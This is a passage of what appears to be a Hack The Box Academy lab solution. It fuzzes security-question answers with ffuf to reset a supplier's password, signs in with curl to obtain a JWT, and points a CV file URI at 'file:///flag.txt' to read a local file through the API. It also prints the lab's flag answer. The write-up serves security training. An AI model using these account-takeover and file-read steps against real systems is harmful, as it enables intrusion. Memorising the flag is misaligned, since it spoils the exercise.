 :: Wordlist         : ANSWER: /home/htb-ac-594497/colors-list.txt
 :: Wordlist         : EMAIL: /home/htb-ac-594497/supplierEmails.txt
 :: Header           : Content-Type: application/json
 :: Header           : Accept: application/json
 :: Data             : {"SupplierEmail": "EMAIL", "SecurityQuestionAnswer": "ANSWER", "NewPassword": "Password123!"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 23
________________________________________________

[Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 130ms]
    * ANSWER: rust
    * EMAIL: B.Rogers1535@globalsolutions.com

:: Progress: [830/830] :: Job [1/1] :: 308 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

Students will find that they are able to reset the password for the `B.Rogers1535@globalsolutions.com` supplier, using `rust` as the answer for their security question.

Now, students need to sign in and authorize as `B.Rogers1535@globalsolutions.com`:

Code: shell

```shell
curl -X 'POST' \
  'http://STMIP:STMPO/api/v2/authentication/suppliers/sign-in' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "B.Rogers1535@globalsolutions.com",
  "Password": "Password123!"
}'
```

```
┌─[us-academy-4]─[10.10.15.43]─[htb-ac-594497@htb-cgw2yb6cuq]─[~]
└──╼ [★]$ curl -X 'POST' \
  'http://83.136.250.98:55651/api/v2/authentication/suppliers/sign-in' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "B.Rogers1535@globalsolutions.com",
  "Password": "Password123!"
}'

{"jwt":"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6IkIuUm9nZXJzMTUzNUBnbG9iYWxzb2x1dGlvbnMuY29tIiwiZXhwIjoxNzIxMzI3MjU3LCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.T1X0xV96PMiTDXJXx7H0_UrCTF3ORlCCaICxsG8I3NP7uHjlkNsTIC4mbXC-_q7Ds89MonWrsMz5G44qDMV1Mg"}
```

![[HTB Solutions/Others/z. images/2968354a0de10908517efa7e134a5221_MD5.jpg]]

After using the JWT to authenticate and authorize, students need to look at the endpoints available under the **Suppliers** group:

![[HTB Solutions/Others/z. images/e25e59211babb5d598d837c5090c3b31_MD5.jpg]]

Of particular interest is the POST `/api/v2/suppliers/current-user/cv` endpoint, which allows uploading the supplier's CV as a PDF file:

![[HTB Solutions/Others/z. images/b1bb31323ef968b43f6f8974a33443f0_MD5.jpg]]

To test the endpoint, students need to find and then upload any PDF file with a size under 10MB:

Code: shell

```shell
find / -name *.pdf 2>/dev/null | xargs ls -lh
```

```
┌─[us-academy-4]─[10.10.15.43]─[htb-ac-594497@htb-cgw2yb6cuq]─[~]
└──╼ [★]$ find / -name *.pdf 2>/dev/null | xargs ls -lh

-rw-r--r-- 1 root root  21K May  3  2023 /usr/lib/libreoffice/share/xpdfimport/xpdfimport_err.pdf
-rw-r--r-- 1 root root  979 May 19  2023 /usr/share/cups/data/classified.pdf
-rw-r--r-- 1 root root  981 May 19  2023 /usr/share/cups/data/confidential.pdf
-rw-r--r-- 1 root root  845 May 19  2023 /usr/share/cups/data/default.pdf
-rw-r--r-- 1 root root 108K May 19  2023 /usr/share/cups/data/default-testpage.pdf
-rw-r--r-- 1 root root 270K May 19  2023 /usr/share/cups/data/form_english.pdf
-rw-r--r-- 1 root root 264K May 19  2023 /usr/share/cups/data/form_russian.pdf
-rw-r--r-- 1 root root  975 May 19  2023 /usr/share/cups/data/secret.pdf
-rw-r--r-- 1 root root  979 May 19  2023 /usr/share/cups/data/standard.pdf
-rw-r--r-- 1 root root  979 May 19  2023 /usr/share/cups/data/topsecret.pdf
-rw-r--r-- 1 root root  981 May 19  2023 /usr/share/cups/data/unclassified.pdf
<SNIP>
```

After attaching the desired PDF (`/usr/share/cups/data/default.pdf` is used in the example seen below) and then executing the endpoint, students will see the `File URI` is shown in the response:

![[HTB Solutions/Others/z. images/00d30708f23630291f889c4a3b0de866_MD5.jpg]]

Now, students need to examine the PATCH `/api/v2/suppliers/current-user` endpoint. Students will find it allows them to update the currently authenticated supplier, specifically their `ProfessionalCVPDFFileURI`. Students need to set the URI to `file:///flag.txt`, and then execute the endpoint:

![[HTB Solutions/Others/z. images/053cb481ecc7223247205667968cba0c_MD5.jpg]]

![[HTB Solutions/Others/z. images/11fc7263442c491e6d3b275157132e7b_MD5.jpg]]

Finally, students need to use the `/api/v2/suppliers/current-user/cv` endpoint to retrieve the contents of `ProfessionalCVPDFFileURI` as base64 data:

![[HTB Solutions/Others/z. images/b44a19b017e840d41b74e968b2a07dde_MD5.jpg]]

After decoding, the flag will be revealed:

Code: shell

```shell
echo SFRCe2YxOTBiODBjZDU0M2E4NGIyMzZlOTJhMDdhOWQ4ZDU5fQo= | base64 -d
```

```
┌─[us-academy-4]─[10.10.15.43]─[htb-ac-594497@htb-cgw2yb6cuq]─[~]
└──╼ [★]$ echo SFRCe2YxOTBiODBjZDU0M2E4NGIyMzZlOTJhMDdhOWQ4ZDU5fQo= | base64 -d

HTB{hidden}
```

Answer: `HTB{f190b80cd543a84b236e92a07a9d8d59}`